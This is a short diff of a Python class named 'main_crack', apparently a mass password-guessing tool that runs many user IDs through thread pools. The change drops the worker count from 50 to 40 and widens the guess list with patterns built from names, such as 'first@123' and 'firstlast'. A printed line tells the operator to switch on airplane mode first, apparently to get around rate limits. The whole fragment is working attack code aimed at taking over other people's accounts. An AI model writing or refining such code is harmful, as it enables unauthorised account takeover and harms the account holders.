@@ -684,7 +684,7 @@ class main_crack():
             print(f'{S}TOTAL IDS :\033[33;1m %s ' % len(self.id))
             print('\x1b[1;92mUSE FLIGHT AIRPLANE MODE BEFORE USE')
             print(48*'_')
-            with devilswork(max_workers=50) as KINGworld:
+            with devilswork(max_workers=40) as KINGworld:
                 for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
@@ -693,7 +693,7 @@ class main_crack():
                            pwx =  pw
                        else:
                             #pwx =  pw
-                            pwx = ['57273200','59039200','57575759','57575752','57575751']
+                            pwx = ['first last','firstlast','first@123','first@1234','57273200','59039200','57575759','57575752','57575751','first@12345','first123','first1234','first12','first@12']
                             if 'methodA' in methods:
                                 KINGworld.submit(self.methodA, uid, name, pwx)
                             elif 'methodB' in methods:
